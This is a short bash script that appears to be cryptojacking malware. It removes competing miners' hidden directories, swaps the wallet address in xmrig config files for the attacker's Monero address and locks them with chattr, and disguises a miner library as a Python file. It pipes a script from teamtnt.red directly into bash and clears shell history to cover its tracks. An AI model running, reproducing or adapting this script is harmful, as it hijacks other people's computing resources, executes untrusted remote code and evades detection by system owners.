#!/bin/bash
if [ -e /tmp/.oyahoe/ ]; then chattr -R -ia /tmp/.oyahoe/ ; tntrecht -R -ia /tmp/.oyahoe/ ; rm -fr /tmp/.oyahoe/ ; fi 2>/dev/null
if [ -e /tmp/.sys/ ]; then chattr -R -ia /tmp/.sys/ ; tntrecht -R -ia /tmp/.sys ; rm -fr /tmp/.sys ; fi 2>/dev/null 
if [ -e /root/xmrig*/ ]; then
chattr -ia /root/xmrig*/config.json 2>/dev/null ; tntrecht -ia /root/xmrig*/config.json 2>/dev/null
sed -i 's/"user": *"[^"]*",/"user": "89oyHGJuSAVVD2NjfExz7dQ68fAKsgJptgB8CBD4qm458WgNV6BnaBgXDHJHNTG7VSbCmuWQK5ABD9UmyijKoogP64pwhPW",/' /root/xmrig*/config.json
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' /root/xmrig*/config.json
chattr +i /root/xmrig*/config.json 2>/dev/null ; tntrecht +i /root/xmrig*/config.json 2>/dev/null
fi
if [ ! -f "~/.syslosc" ]; then
echo '' | base64 -d | bash
fi
if [ -f /usr/local/lib/xmrig.so ]; then mv /usr/local/lib/xmrig.so /usr/local/lib/python3.5.so ; fi
curl -# -Lk https://teamtnt.red/sh/ssh | bash
history -c
clear
